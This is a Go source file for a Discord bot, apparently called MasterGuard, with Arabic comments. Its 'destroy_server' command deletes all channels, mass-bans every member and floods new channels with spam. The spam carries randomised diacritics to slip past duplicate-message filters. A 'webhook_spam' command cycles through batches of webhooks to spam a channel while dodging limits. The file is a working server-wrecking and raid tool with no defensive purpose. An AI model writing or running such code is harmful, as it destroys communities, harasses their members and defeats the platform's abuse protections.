package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

var client = &http.Client{
	Timeout: 10 * time.Second,
	Transport: &http.Transport{
		DialContext: (&net.Dialer{
			Timeout:   5 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		MaxIdleConns:        500,
		MaxIdleConnsPerHost: 100,
		IdleConnTimeout:     90 * time.Second,
	},
}

func main() {
	token := os.Getenv("MASTERGUARD_TOKEN")
	if token == "" {
		fmt.Println("❌ خطأ: لم يتم العثور على التوكن في متغير البيئة MASTERGUARD_TOKEN")
		return
	}

	sess, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("خطأ في إنشاء جلسة البوت:", err)
		return
	}

	sess.Identify.Intents = discordgo.IntentsGuilds | discordgo.IntentsGuildMembers | discordgo.IntentsGuildWebhooks | discordgo.IntentsAll

	// تعريف أمر تدمير السيرفر
	destroyCmd := &discordgo.ApplicationCommand{
		Name:        "destroy_server",
		Description: "أمر تدمير السيرفر (باند مضمون وسرعة صاروخية)",
		Options: []*discordgo.ApplicationCommandOption{
			{Type: discordgo.ApplicationCommandOptionString, Name: "room_name", Description: "اسم الرومات الجديدة", Required: true},
			{Type: discordgo.ApplicationCommandOptionInteger, Name: "rooms_count", Description: "عدد الرومات المراد إنشاؤها", Required: true},
			{Type: discordgo.ApplicationCommandOptionString, Name: "message_content", Description: "محتوى رسالة السبام", Required: true},
			{Type: discordgo.ApplicationCommandOptionInteger, Name: "messages_count", Description: "عدد الرسائل في كل روم", Required: true},
		},
	}

	// تعريف أمر الويب هوكات
	webhookCmd := &discordgo.ApplicationCommand{
		Name:        "webhook_spam",
		Description: "إنشاء 10 ويب هوكات، سبام، استراحة 3 ثواني، وحذفهم وتجديدهم",
		Options: []*discordgo.ApplicationCommandOption{
			{Type: discordgo.ApplicationCommandOptionChannel, Name: "channel", Description: "الروم المحدد للإرسال", Required: true},
			{Type: discordgo.ApplicationCommandOptionString, Name: "webhook_name", Description: "اسم الويب هوك", Required: true},
			{Type: discordgo.ApplicationCommandOptionString, Name: "message_content", Description: "محتوى الرسالة", Required: true},
			{Type: discordgo.ApplicationCommandOptionInteger, Name: "messages_count", Description: "عدد الرسائل الإجمالي", Required: true},
		},
	}

	sess.AddHandler(func(s *discordgo.Session, i *discordgo.InteractionCreate) {
		if i.Type != discordgo.InteractionApplicationCommand {
			return
		}

		data := i.ApplicationCommandData()

		if (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "❌ يجب أن تكون مشرفاً لاستخدام هذا الأمر.",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			return
		}

		if data.Name == "destroy_server" {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "🚀 جاري تدمير السيرفر وباند الأعضاء بالكامل في الخلفية...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			optMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
			for _, opt := range data.Options {
				optMap[opt.Name] = opt
			}

			roomName := optMap["room_name"].StringValue()
			roomsCount := int(optMap["rooms_count"].IntValue())
			messageContent := optMap["message_content"].StringValue()
			messagesCount := int(optMap["messages_count"].IntValue())
			guildID := i.GuildID

			go executeDestruction(s, token, guildID, roomName, roomsCount, messageContent, messagesCount)
			return
		}

		if data.Name == "webhook_spam" {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "⚡ جاري تشغيل مجمع الويب هوكات الذكي (10 ويب هوكات + حذف وتجديد)...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			optMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
			for _, opt := range data.Options {
				optMap[opt.Name] = opt
			}

			targetChannel := optMap["channel"].ChannelValue(s)
			webhookName := optMap["webhook_name"].StringValue()
			messageContent := optMap["message_content"].StringValue()
			messagesCount := int(optMap["messages_count"].IntValue())

			go runWebhookLoop(token, targetChannel.ID, webhookName, messageContent, messagesCount)
			return
		}
	})

	err = sess.Open()
	if err != nil {
		fmt.Println("خطأ في فتح الاتصال:", err)
		return
	}

	// تسجيل الأوامر في ديسكورد
	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", destroyCmd)
	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", webhookCmd)

	fmt.Println("🤖 البوت شغال الآن وجاهز بكل الأوامر بنجاح!")

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-stop

	sess.Close()
}

// دالة تدمير السيرفر الأصلية
func executeDestruction(s *discordgo.Session, token, guildID, roomName string, roomsCount int, messageContent string, messagesCount int) {
	headers := map[string]string{
		"Authorization": "Bot " + token,
		"Content-Type":  "application/json",
	}

	go func() {
		req, _ := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/channels", nil)
		for k, v := range headers {
			req.Header.Set(k, v)
		}
		resp, err := client.Do(req)
		if err != nil {
			return
		}
		defer resp.Body.Close()

		var channels []map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&channels)

		for _, ch := range channels {
			if id, ok := ch["id"].(string); ok {
				go func(chID string) {
					delReq, _ := http.NewRequest("DELETE", "https://discord.com/api/v10/channels/"+chID, nil)
					for k, v := range headers {
						delReq.Header.Set(k, v)
					}
					if r, e := client.Do(delReq); e == nil {
						r.Body.Close()
					}
				}(id)
			}
		}
	}()

	go func() {
		var userIDs []string
		after := ""

		for {
			members, err := s.GuildMembers(guildID, after, 1000)
			if err != nil || len(members) == 0 {
				break
			}

			for _, member := range members {
				userIDs = append(userIDs, member.User.ID)
				after = member.User.ID
			}

			if len(members) < 1000 {
				break
			}
		}

		batchSize := 50
		for i := 0; i < len(userIDs); i += batchSize {
			end := i + batchSize
			if end > len(userIDs) {
				end = len(userIDs)
			}

			for _, uID := range userIDs[i:end] {
				go func(id string) {
					for {
						err := s.GuildBanCreate(guildID, id, 0)
						if err == nil {
							break
						}
						time.Sleep(300 * time.Millisecond)
					}
				}(uID)
			}
			time.Sleep(100 * time.Millisecond)
		}
	}()

	var channelIDs []string
	var mu sync.Mutex
	var wg sync.WaitGroup

	groupSize := 10
	for i := 0; i < roomsCount; i += groupSize {
		end := i + groupSize
		if end > roomsCount {
			end = roomsCount
		}

		for j := i; j < end; j++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				payload, _ := json.Marshal(map[string]interface{}{
					"name": roomName,
					"type": 0,
				})
				req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(payload))
				for k, v := range headers {
					req.Header.Set(k, v)
				}

				resp, err := client.Do(req)
				if err != nil {
					return
				}
				defer resp.Body.Close()

				if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
					var chResult map[string]interface{}
					json.NewDecoder(resp.Body).Decode(&chResult)
					if chID, ok := chResult["id"].(string); ok {
						mu.Lock()
						channelIDs = append(channelIDs, chID)
						mu.Unlock()
					}
				} else if resp.StatusCode == 429 {
					time.Sleep(200 * time.Millisecond)
				}
			}()
		}
		wg.Wait()
		time.Sleep(30 * time.Millisecond)
	}

	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	arabicDiacritics := []string{"ِ", "ُ", "َّ", "ٍ", "ٓ", "ٌ", "ْ", "ٰ"}

	for i := 0; i < len(channelIDs); i += groupSize {
		end := i + groupSize
		if end > len(channelIDs) {
			end = len(channelIDs)
		}

		for _, chID := range channelIDs[i:end] {
			go func(cID string) {
				for m := 0; m < messagesCount; m++ {
					diacriticsSalt := ""
					for k := 0; k <= (m % 3); k++ {
						diacriticsSalt += arabicDiacritics[rng.Intn(len(arabicDiacritics))]
					}
					finalMsg := messageContent + diacriticsSalt

					msgPayload, _ := json.Marshal(map[string]string{"content": finalMsg})
					msgReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+cID+"/messages", bytes.NewBuffer(msgPayload))
					for k, v := range headers {
						msgReq.Header.Set(k, v)
					}

					msgResp, err := client.Do(msgReq)
					if err == nil {
						if msgResp.StatusCode == 429 {
							time.Sleep(500 * time.Millisecond)
						}
						msgResp.Body.Close()
					}
					time.Sleep(50 * time.Millisecond)
				}
			}(chID)
		}
		time.Sleep(40 * time.Millisecond)
	}
}

// دالة الويب هوكات (إنشاء 10 👈 سبام 👈 استراحة 3 ثواني 👈 حذف مؤكد وتجديد)
func runWebhookLoop(token, channelID, whName, msgContent string, totalMsgs int) {
	headers := map[string]string{
		"Authorization": "Bot " + token,
		"Content-Type":  "application/json",
	}

	sent := 0
	poolSize := 10
	round := 1

	type WH struct {
		ID  string
		URL string
	}

	for sent < totalMsgs {
		var pool []WH
		var mu sync.Mutex
		var wg sync.WaitGroup

		// 1. إنشاء 10 ويب هوكات
		for i := 0; i < poolSize; i++ {
			wg.Add(1)
			go func(idx int) {
				defer wg.Done()
				body, _ := json.Marshal(map[string]string{"name": fmt.Sprintf("%s-%d-%d", whName, idx+1, time.Now().UnixNano()%10000)})
				req, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+channelID+"/webhooks", bytes.NewBuffer(body))
				for k, v := range headers {
					req.Header.Set(k, v)
				}

				resp, err := client.Do(req)
				if err != nil {
					return
				}
				defer resp.Body.Close()

				if resp.StatusCode == 200 || resp.StatusCode == 201 {
					var res map[string]interface{}
					if json.NewDecoder(resp.Body).Decode(&res) == nil {
						if id, ok1 := res["id"].(string); ok1 {
							if tk, ok2 := res["token"].(string); ok2 {
								mu.Lock()
								pool = append(pool, WH{
									ID:  id,
									URL: fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", id, tk),
								})
								mu.Unlock()
							}
						}
					}
				}
			}(i)
		}
		wg.Wait()

		if len(pool) == 0 {
			time.Sleep(1 * time.Second)
			continue
		}

		// 2. إرسال الرسائل عبر الـ 10 ويب هوكات الحالية
		batchToSend := 50
		if totalMsgs-sent < batchToSend {
			batchToSend = totalMsgs - sent
		}

		var spamWg sync.WaitGroup
		for j := 0; j < batchToSend; j++ {
			spamWg.Add(1)
			go func(mIdx int, targetWH WH) {
				defer spamWg.Done()
				b, _ := json.Marshal(map[string]string{"content": fmt.Sprintf("%s (%d)", msgContent, mIdx+1)})
				req, _ := http.NewRequest("POST", targetWH.URL, bytes.NewBuffer(b))
				req.Header.Set("Content-Type", "application/json")

				if resp, err := client.Do(req); err == nil {
					resp.Body.Close()
				}
			}(sent+j, pool[j%len(pool)])
		}
		spamWg.Wait()
		sent += batchToSend

		// 3. استراحة 3 ثواني
		time.Sleep(3 * time.Second)

		// 4. حذف الـ 10 ويب هوكات القدامى فعلياً والانتظار حتى اكتمال الحذف
		var delWg sync.WaitGroup
		for _, w := range pool {
			delWg.Add(1)
			go func(webhookID string) {
				defer delWg.Done()
				req, _ := http.NewRequest("DELETE", "https://discord.com/api/v10/webhooks/"+webhookID, nil)
				for k, v := range headers {
					req.Header.Set(k, v)
				}
				if resp, err := client.Do(req); err == nil {
					resp.Body.Close()
				}
			}(w.ID)
		}
		delWg.Wait()

		round++
		time.Sleep(500 * time.Millisecond)
	}
}
